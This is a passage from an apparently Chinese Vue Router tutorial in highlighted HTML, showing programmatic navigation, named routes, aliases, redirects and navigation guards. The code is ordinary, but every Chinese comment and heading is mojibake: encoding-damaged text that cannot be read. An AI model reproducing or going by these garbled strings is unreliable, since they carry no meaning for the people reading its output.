    <span class="hljs-attr">q</span>: <span class="hljs-string">'vue router'</span>,
    <span class="hljs-attr">page</span>: <span class="hljs-number">2</span>,
    <span class="hljs-attr">sort</span>: <span class="hljs-string">'desc'</span>
  }
})

<span class="hljs-comment">// æ–¹æ³•5ï¼šå¸¦å“ˆå¸Œ</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/document'</span>,
  <span class="hljs-attr">hash</span>: <span class="hljs-string">'#installation'</span>
})

<span class="hljs-comment">// æ–¹æ³•6ï¼šå¸¦çŠ¶æ€ï¼ˆä¸æ˜¾ç¤ºåœ¨URLä¸­ï¼‰</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Checkout'</span>,
  <span class="hljs-attr">state</span>: {
    <span class="hljs-attr">cartItems</span>: [<span class="hljs-string">'item1'</span>, <span class="hljs-string">'item2'</span>],
    <span class="hljs-attr">discountCode</span>: <span class="hljs-string">'SAVE10'</span>
  }
})

<span class="hljs-comment">// æ–¹æ³•7ï¼šåŠ¨æ€è·¯å¾„</span>
<span class="hljs-keyword">const</span> userId = <span class="hljs-number">456</span>
<span class="hljs-keyword">const</span> userType = <span class="hljs-string">'vip'</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">path</span>: <span class="hljs-string">`/user/<span class="hljs-subst">${userId}</span>`</span>,
  <span class="hljs-attr">query</span>: { <span class="hljs-attr">type</span>: userType }
})

<span class="hljs-comment">// æ–¹æ³•8ï¼šæ¡ä»¶è·³è½¬</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">navigateTo</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">if</span> (userStore.<span class="hljs-property">isLoggedIn</span>) {
    router.<span class="hljs-title function_">push</span>(target)
  } <span class="hljs-keyword">else</span> {
    router.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
      <span class="hljs-attr">query</span>: { <span class="hljs-attr">redirect</span>: target.<span class="hljs-property">path</span> || target }
    })
  }
}
</code></pre>
<h4 data-id="heading-7">3.2 <code>router.replace()</code> - æ›¿æ¢å½“å‰å†å²è®°å½•</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åœºæ™¯1ï¼šç™»å½•åè·³è½¬ï¼ˆä¸è®©ç”¨æˆ·è¿”å›ç™»å½•é¡µï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleLogin</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">login</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    router.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'/dashboard'</span>) <span class="hljs-comment">// æ›¿æ¢ç™»å½•é¡µè®°å½•</span>
  })
}

<span class="hljs-comment">// åœºæ™¯2ï¼šè¡¨å•æäº¤å</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">submitForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">submit</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æäº¤æˆåŠŸåï¼Œæ›¿æ¢å½“å‰é¡µ</span>
    router.<span class="hljs-title function_">replace</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">'Success'</span>,
      <span class="hljs-attr">query</span>: { <span class="hljs-attr">formId</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">formId</span> }
    })
  })
}

<span class="hljs-comment">// åœºæ™¯3ï¼šé‡å®šå‘ä¸­é—´é¡µ</span>
<span class="hljs-comment">// è®¿é—® /redirect?target=/dashboard</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">path</span> === <span class="hljs-string">'/redirect'</span>) {
    <span class="hljs-keyword">const</span> target = to.<span class="hljs-property">query</span>.<span class="hljs-property">target</span>
    router.<span class="hljs-title function_">replace</span>(target || <span class="hljs-string">'/'</span>)
    <span class="hljs-keyword">return</span>
  }
  <span class="hljs-title function_">next</span>()
})

<span class="hljs-comment">// åœºæ™¯4ï¼šé”™è¯¯é¡µé¢å¤„ç†</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">loadProduct</span>(<span class="hljs-params">id</span>) {
  <span class="hljs-title function_">fetchProduct</span>(id).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
    <span class="hljs-comment">// é”™è¯¯æ—¶æ›¿æ¢åˆ°é”™è¯¯é¡µ</span>
    router.<span class="hljs-title function_">replace</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">'Error'</span>,
      <span class="hljs-attr">params</span>: { <span class="hljs-attr">message</span>: <span class="hljs-string">'äº§å“åŠ è½½å¤±è´¥'</span> }
    })
  })
}
</code></pre>
<h4 data-id="heading-8">3.3 <code>router.go()</code> - å†å²è®°å½•å¯¼èˆª</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰è¿›åé€€</span>
router.<span class="hljs-title function_">go</span>(<span class="hljs-number">1</span>)   <span class="hljs-comment">// å‰è¿›1æ­¥</span>
router.<span class="hljs-title function_">go</span>(-<span class="hljs-number">1</span>)  <span class="hljs-comment">// åé€€1æ­¥</span>
router.<span class="hljs-title function_">go</span>(-<span class="hljs-number">3</span>)  <span class="hljs-comment">// åé€€3æ­¥</span>
router.<span class="hljs-title function_">go</span>(<span class="hljs-number">0</span>)   <span class="hljs-comment">// åˆ·æ–°å½“å‰é¡µ</span>

<span class="hljs-comment">// å¿«æ·æ–¹æ³•</span>
router.<span class="hljs-title function_">back</span>()     <span class="hljs-comment">// åé€€ = router.go(-1)</span>
router.<span class="hljs-title function_">forward</span>()  <span class="hljs-comment">// å‰è¿› = router.go(1)</span>

<span class="hljs-comment">// å®é™…åº”ç”¨</span>
<span class="hljs-keyword">const</span> navigationHistory = []

<span class="hljs-comment">// è®°å½•å¯¼èˆªå†å²</span>
router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  navigationHistory.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">from</span>: <span class="hljs-keyword">from</span>.<span class="hljs-property">fullPath</span>,
    <span class="hljs-attr">to</span>: to.<span class="hljs-property">fullPath</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
  })
})

<span class="hljs-comment">// è¿”å›æŒ‡å®šæ­¥éª¤</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">goBackSteps</span>(<span class="hljs-params">steps</span>) {
  <span class="hljs-keyword">if</span> (router.<span class="hljs-property">currentRoute</span>.<span class="hljs-property">value</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">preventBack</span>) {
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">'å½“å‰é¡µé¢ç¦æ­¢è¿”å›'</span>)
    <span class="hljs-keyword">return</span>
  }
  
  router.<span class="hljs-title function_">go</span>(-steps)
}

<span class="hljs-comment">// è¿”å›é¦–é¡µ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">goHome</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> currentDepth = navigationHistory.<span class="hljs-property">length</span>
  router.<span class="hljs-title function_">go</span>(-currentDepth + <span class="hljs-number">1</span>) <span class="hljs-comment">// ä¿ç•™é¦–é¡µ</span>
}

<span class="hljs-comment">// é¢åŒ…å±‘å¯¼èˆª</span>
<span class="hljs-keyword">const</span> breadcrumbs = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> paths = []
  <span class="hljs-keyword">let</span> current = router.<span class="hljs-property">currentRoute</span>.<span class="hljs-property">value</span>
  
  <span class="hljs-keyword">while</span> (current) {
    paths.<span class="hljs-title function_">unshift</span>(current)
    <span class="hljs-comment">// æ ¹æ®metaä¸­çš„parentå­—æ®µæŸ¥æ‰¾çˆ¶è·¯ç”±</span>
    current = routes.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">name</span> === current.<span class="hljs-property">meta</span>?.<span class="hljs-property">parent</span>)
  }
  
  <span class="hljs-keyword">return</span> paths
})
</code></pre>
<h4 data-id="heading-9">3.4 ç¼–ç¨‹å¼å¯¼èˆªæœ€ä½³å®è·µ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. å°è£…å¯¼èˆªå·¥å…·å‡½æ•°</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> nav = {
  <span class="hljs-comment">// å¸¦æƒé™æ£€æŸ¥çš„è·³è½¬</span>
  <span class="hljs-title function_">pushWithAuth</span>(<span class="hljs-params">to, requiredRole = <span class="hljs-literal">null</span></span>) {
    <span class="hljs-keyword">if</span> (!authStore.<span class="hljs-property">isLoggedIn</span>) {
      <span class="hljs-keyword">return</span> router.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
        <span class="hljs-attr">query</span>: { <span class="hljs-attr">redirect</span>: <span class="hljs-keyword">typeof</span> to === <span class="hljs-string">'string'</span> ? to : to.<span class="hljs-property">path</span> }
      })
    }
    
    <span class="hljs-keyword">if</span> (requiredRole &amp;&amp; !authStore.<span class="hljs-title function_">hasRole</span>(requiredRole)) {
      <span class="hljs-keyword">return</span> router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/unauthorized'</span>)
    }
    
    <span class="hljs-keyword">return</span> router.<span class="hljs-title function_">push</span>(to)
  },
  
  <span class="hljs-comment">// å¸¦ç¡®è®¤çš„è·³è½¬</span>
  <span class="hljs-title function_">pushWithConfirm</span>(<span class="hljs-params">to, message = <span class="hljs-string">'ç¡®å®šç¦»å¼€å½“å‰é¡µé¢ï¼Ÿ'</span></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">confirm</span>(message)) {
        router.<span class="hljs-title function_">push</span>(to).<span class="hljs-title function_">then</span>(resolve)
      }
    })
  },
  
  <span class="hljs-comment">// æ–°æ ‡ç­¾é¡µæ‰“å¼€</span>
  <span class="hljs-title function_">openInNewTab</span>(<span class="hljs-params">to</span>) {
    <span class="hljs-keyword">const</span> route = router.<span class="hljs-title function_">resolve</span>(to)
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(route.<span class="hljs-property">href</span>, <span class="hljs-string">'_blank'</span>)
  },
  
  <span class="hljs-comment">// å¸¦Loadingçš„è·³è½¬</span>
  <span class="hljs-title function_">pushWithLoading</span>(<span class="hljs-params">to</span>) {
    loadingStore.<span class="hljs-title function_">show</span>()
    <span class="hljs-keyword">return</span> router.<span class="hljs-title function_">push</span>(to).<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
      loadingStore.<span class="hljs-title function_">hide</span>()
    })
  }
}

<span class="hljs-comment">// 2. ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="hljs-attr">methods</span>: {
  <span class="hljs-title function_">viewProductDetail</span>(<span class="hljs-params">product</span>) {
    nav.<span class="hljs-title function_">pushWithAuth</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">'ProductDetail'</span>,
      <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: product.<span class="hljs-property">id</span> }
    }, <span class="hljs-string">'user'</span>)
  },
  
  <span class="hljs-title function_">editProduct</span>(<span class="hljs-params">product</span>) {
    nav.<span class="hljs-title function_">pushWithConfirm</span>(
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'ProductEdit'</span>, <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: product.<span class="hljs-property">id</span> } },
      <span class="hljs-string">'æœ‰æœªä¿å­˜çš„æ›´æ”¹ï¼Œç¡®å®šè¦ç¼–è¾‘å—ï¼Ÿ'</span>
    )
  }
}
</code></pre>
<h3 data-id="heading-10">å››ã€å‘½åè·¯ç”±è·³è½¬</h3>
<h4 data-id="heading-11">4.1 é…ç½®å’Œä½¿ç”¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// router/index.js</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>,  <span class="hljs-comment">// å‘½åè·¯ç”±</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:userId'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'UserProfile'</span>,  <span class="hljs-comment">// å‘½åè·¯ç”±</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">UserProfile</span>,
    <span class="hljs-attr">props</span>: <span class="hljs-literal">true</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/product/:category/:id'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'ProductDetail'</span>,  <span class="hljs-comment">// å‘½åè·¯ç”±</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">ProductDetail</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/search'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Search'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Search</span>,
    <span class="hljs-attr">props</span>: <span class="hljs-function"><span class="hljs-params">route</span> =&gt;</span> ({ <span class="hljs-attr">query</span>: route.<span class="hljs-property">query</span>.<span class="hljs-property">q</span> })
  }
]

<span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨å‘½åè·¯ç”±</span>
<span class="hljs-comment">// å£°æ˜å¼</span>
&lt;router-link :to=<span class="hljs-string">"{ name: 'UserProfile', params: { userId: 123 } }"</span>&gt;
  ç”¨æˆ·èµ„æ–™
&lt;/router-link&gt;

<span class="hljs-comment">// ç¼–ç¨‹å¼</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'ProductDetail'</span>,
  <span class="hljs-attr">params</span>: {
    <span class="hljs-attr">category</span>: <span class="hljs-string">'electronics'</span>,
    <span class="hljs-attr">id</span>: <span class="hljs-number">456</span>
  }
})

<span class="hljs-comment">// å¸¦æŸ¥è¯¢å‚æ•°</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Search'</span>,
  <span class="hljs-attr">query</span>: {
    <span class="hljs-attr">q</span>: <span class="hljs-string">'vue router'</span>,
    <span class="hljs-attr">sort</span>: <span class="hljs-string">'price'</span>
  }
})
</code></pre>
<h4 data-id="heading-12">4.2 å‘½åè·¯ç”±çš„ä¼˜åŠ¿</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¼˜åŠ¿1ï¼šè·¯å¾„è§£è€¦ï¼Œé‡æ„æ–¹ä¾¿</span>
<span class="hljs-comment">// æ—§è·¯å¾„ï¼š/user/:id</span>
<span class="hljs-comment">// æ–°è·¯å¾„ï¼š/profile/:id</span>
<span class="hljs-comment">// åªéœ€ä¿®æ”¹è·¯ç”±é…ç½®ï¼Œæ— éœ€ä¿®æ”¹è·³è½¬ä»£ç </span>

<span class="hljs-comment">// ä¼˜åŠ¿2ï¼šæ¸…æ™°çš„å‚æ•°ä¼ é€’</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'OrderCheckout'</span>,
  <span class="hljs-attr">params</span>: {
    <span class="hljs-attr">orderId</span>: <span class="hljs-string">'ORD-2024-001'</span>,
    <span class="hljs-attr">step</span>: <span class="hljs-string">'payment'</span>  <span class="hljs-comment">// å‚æ•°åæ¸…æ™°</span>
  },
  <span class="hljs-attr">query</span>: {
    <span class="hljs-attr">coupon</span>: <span class="hljs-string">'SAVE20'</span>,
    <span class="hljs-attr">source</span>: <span class="hljs-string">'cart'</span>
  }
})

<span class="hljs-comment">// ä¼˜åŠ¿3ï¼šåµŒå¥—è·¯ç”±è·³è½¬</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Admin'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">AdminLayout</span>,
    <span class="hljs-attr">children</span>: [
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'users'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">'AdminUsers'</span>,  <span class="hljs-comment">// å…¨åï¼šAdminUsers</span>
        <span class="hljs-attr">component</span>: <span class="hljs-title class_">AdminUsers</span>
      },
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'settings'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">'AdminSettings'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-title class_">AdminSettings</span>
      }
    ]
  }
]

<span class="hljs-comment">// è·³è½¬åˆ°åµŒå¥—è·¯ç”±</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'AdminUsers'</span> })  <span class="hljs-comment">// è‡ªåŠ¨æ‰¾åˆ°å®Œæ•´è·¯å¾„</span>
</code></pre>
<h3 data-id="heading-13">äº”ã€è·¯ç”±åˆ«åå’Œé‡å®šå‘</h3>
<h4 data-id="heading-14">5.1 è·¯ç”±åˆ«å</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¤šä¸ªè·¯å¾„æŒ‡å‘åŒä¸€ç»„ä»¶</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/home'</span>,
    <span class="hljs-attr">alias</span>: [<span class="hljs-string">'/index'</span>, <span class="hljs-string">'/main'</span>, <span class="hljs-string">'/'</span>],  <span class="hljs-comment">// å¤šä¸ªåˆ«å</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>,
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'é¦–é¡µ'</span> }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/about-us'</span>,
    <span class="hljs-attr">alias</span>: <span class="hljs-string">'/company'</span>,  <span class="hljs-comment">// å•ä¸ªåˆ«å</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">About</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/products/:id'</span>,
    <span class="hljs-attr">alias</span>: <span class="hljs-string">'/items/:id'</span>,  <span class="hljs-comment">// å¸¦å‚æ•°çš„åˆ«å</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">ProductDetail</span>
  }
]

<span class="hljs-comment">// å®é™…åº”ç”¨åœºæ™¯</span>
<span class="hljs-keyword">const</span> routes = [
  <span class="hljs-comment">// åœºæ™¯1ï¼šSEOä¼˜åŒ– - å¤šä¸ªå…³é”®è¯</span>
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/vue-tutorial'</span>,
    <span class="hljs-attr">alias</span>: [<span class="hljs-string">'/vue-æ•™ç¨‹'</span>, <span class="hljs-string">'/vue-å…¥é—¨'</span>, <span class="hljs-string">'/vue-guide'</span>],
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Tutorial</span>
  },
  
  <span class="hljs-comment">// åœºæ™¯2ï¼šå…¼å®¹æ—§URL</span>
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/new-url'</span>,
    <span class="hljs-attr">alias</span>: [<span class="hljs-string">'/old-url'</span>, <span class="hljs-string">'/legacy-url'</span>, <span class="hljs-string">'/deprecated-path'</span>],
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">NewComponent</span>,
    <span class="hljs-attr">meta</span>: { 
      <span class="hljs-attr">canonical</span>: <span class="hljs-string">'/new-url'</span>,  <span class="hljs-comment">// å‘Šè¯‰æœç´¢å¼•æ“ä¸»URL</span>
      <span class="hljs-attr">redirect301</span>: <span class="hljs-literal">true</span> 
    }
  },
  
  <span class="hljs-comment">// åœºæ™¯3ï¼šå¤šè¯­è¨€è·¯å¾„</span>
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/en/about'</span>,
    <span class="hljs-attr">alias</span>: [<span class="hljs-string">'/zh/about'</span>, <span class="hljs-string">'/ja/about'</span>, <span class="hljs-string">'/ko/about'</span>],
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">About</span>,
    <span class="hljs-title function_">beforeEnter</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
      <span class="hljs-comment">// æ ¹æ®è·¯å¾„è®¾ç½®è¯­è¨€</span>
      <span class="hljs-keyword">const</span> lang = to.<span class="hljs-property">path</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>)[<span class="hljs-number">1</span>]
      i18n.<span class="hljs-property">locale</span> = lang
      <span class="hljs-title function_">next</span>()
    }
  }
]
</code></pre>
<h4 data-id="heading-15">5.2 è·¯ç”±é‡å®šå‘</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. ç®€å•é‡å®šå‘</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/home'</span>,
    <span class="hljs-attr">redirect</span>: <span class="hljs-string">'/dashboard'</span>  <span class="hljs-comment">// è®¿é—®/homeè·³è½¬åˆ°/dashboard</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">redirect</span>: <span class="hljs-string">'/home'</span>  <span class="hljs-comment">// æ ¹è·¯å¾„é‡å®šå‘</span>
  }
]

<span class="hljs-comment">// 2. å‘½åè·¯ç”±é‡å®šå‘</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/user'</span>,
    <span class="hljs-attr">redirect</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'UserList'</span> }  <span class="hljs-comment">// é‡å®šå‘åˆ°å‘½åè·¯ç”±</span>
  }
]

<span class="hljs-comment">// 3. å‡½æ•°å¼é‡å®šå‘ï¼ˆåŠ¨æ€ï¼‰</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id'</span>,
    <span class="hljs-attr">redirect</span>: <span class="hljs-function"><span class="hljs-params">to</span> =&gt;</span> {
      <span class="hljs-comment">// æ ¹æ®å‚æ•°åŠ¨æ€é‡å®šå‘</span>
      <span class="hljs-keyword">const</span> userType = <span class="hljs-title function_">getUserType</span>(to.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
      <span class="hljs-keyword">if</span> (userType === <span class="hljs-string">'admin'</span>) {
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">name</span>: <span class="hljs-string">'AdminProfile'</span>, <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: to.<span class="hljs-property">params</span>.<span class="hljs-property">id</span> } }
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">name</span>: <span class="hljs-string">'UserProfile'</span>, <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: to.<span class="hljs-property">params</span>.<span class="hljs-property">id</span> } }
      }
    }
  }
]

<span class="hljs-comment">// 4. å®é™…åº”ç”¨åœºæ™¯</span>
<span class="hljs-keyword">const</span> routes = [
  <span class="hljs-comment">// åœºæ™¯1ï¼šç‰ˆæœ¬å‡çº§é‡å®šå‘</span>
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/v1/products/:id'</span>,
    <span class="hljs-attr">redirect</span>: <span class="hljs-function"><span class="hljs-params">to</span> =&gt;</span> <span class="hljs-string">`/products/<span class="hljs-subst">${to.params.id}</span>?version=v1`</span>
  },
  
  <span class="hljs-comment">// åœºæ™¯2ï¼šæƒé™é‡å®šå‘</span>
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
    <span class="hljs-attr">redirect</span>: <span class="hljs-function"><span class="hljs-params">to</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (authStore.<span class="hljs-property">isAdmin</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">'/admin/dashboard'</span>
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">'/unauthorized'</span>
      }
    }
  },
  
  <span class="hljs-comment">// åœºæ™¯3ï¼šä¸´æ—¶é‡å®šå‘ï¼ˆç»´æŠ¤é¡µé¢ï¼‰</span>
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/under-maintenance'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Maintenance</span>,
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">maintenance</span>: <span class="hljs-literal">true</span> }
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">redirect</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (isMaintenanceMode) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">'/under-maintenance'</span>
      }
      <span class="hljs-keyword">return</span> <span class="hljs-string">'/home'</span>
    }
  },
  
  <span class="hljs-comment">// åœºæ™¯4ï¼š404é¡µé¢æ•è·</span>
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/:pathMatch(.*)*'</span>,  <span class="hljs-comment">// æ•è·æ‰€æœ‰æœªåŒ¹é…è·¯å¾„</span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">'NotFound'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">NotFound</span>,
    <span class="hljs-title function_">beforeEnter</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
      <span class="hljs-comment">// è®°å½•404è®¿é—®</span>
      <span class="hljs-title function_">log404</span>(to.<span class="hljs-property">fullPath</span>)
      <span class="hljs-title function_">next</span>()
    }
  }
]
</code></pre>
<h3 data-id="heading-16">å…­ã€å¯¼èˆªå®ˆå«æ§åˆ¶è·³è½¬</h3>
<h4 data-id="heading-17">6.1 å®Œæ•´çš„å®ˆå«æµç¨‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®Œæ•´çš„å¯¼èˆªè§£ææµç¨‹</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  routes,
  <span class="hljs-comment">// å…¨å±€é…ç½®</span>
})

<span class="hljs-comment">// 1. å¯¼èˆªè¢«è§¦å‘</span>
<span class="hljs-comment">// 2. åœ¨å¤±æ´»çš„ç»„ä»¶é‡Œè°ƒç”¨ beforeRouteLeave å®ˆå«</span>
<span class="hljs-comment">// 3. è°ƒç”¨å…¨å±€çš„ beforeEach å®ˆå«</span>
<span class="hljs-comment">// 4. åœ¨é‡ç”¨çš„ç»„ä»¶é‡Œè°ƒç”¨ beforeRouteUpdate å®ˆå«</span>
<span class="hljs-comment">// 5. åœ¨è·¯ç”±é…ç½®é‡Œè°ƒç”¨ beforeEnter å®ˆå«</span>
<span class="hljs-comment">// 6. è§£æå¼‚æ­¥è·¯ç”±ç»„ä»¶</span>
<span class="hljs-comment">// 7. åœ¨è¢«æ¿€æ´»çš„ç»„ä»¶é‡Œè°ƒç”¨ beforeRouteEnter å®ˆå«</span>
<span class="hljs-comment">// 8. è°ƒç”¨å…¨å±€çš„ beforeResolve å®ˆå«</span>
<span class="hljs-comment">// 9. å¯¼èˆªè¢«ç¡®è®¤</span>
<span class="hljs-comment">// 10. è°ƒç”¨å…¨å±€çš„ afterEach å®ˆå«</span>
<span class="hljs-comment">// 11. è§¦å‘ DOM æ›´æ–°</span>
<span class="hljs-comment">// 12. è°ƒç”¨ beforeRouteEnter å®ˆå«ä¸­ä¼ ç»™ next çš„å›è°ƒå‡½æ•°</span>

<span class="hljs-comment">// å®é™…åº”ç”¨ï¼šæƒé™æ§åˆ¶æµç¨‹</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">AdminLayout</span>,
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">requiresAdmin</span>: <span class="hljs-literal">true</span> },
    <span class="hljs-attr">beforeEnter</span>: <span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
      <span class="hljs-comment">// è·¯ç”±ç‹¬äº«å®ˆå«</span>
      <span class="hljs-keyword">if</span> (!authStore.<span class="hljs-property">isAdmin</span>) {
        <span class="hljs-title function_">next</span>(<span class="hljs-string">'/unauthorized'</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">next</span>()
      }
    },
    <span class="hljs-attr">children</span>: [
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'dashboard'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-title class_">AdminDashboard</span>,
        <span class="hljs-attr">meta</span>: { <span class="hljs-attr">requiresSuperAdmin</span>: <span class="hljs-literal">true</span> }
      }
    ]
  }
]

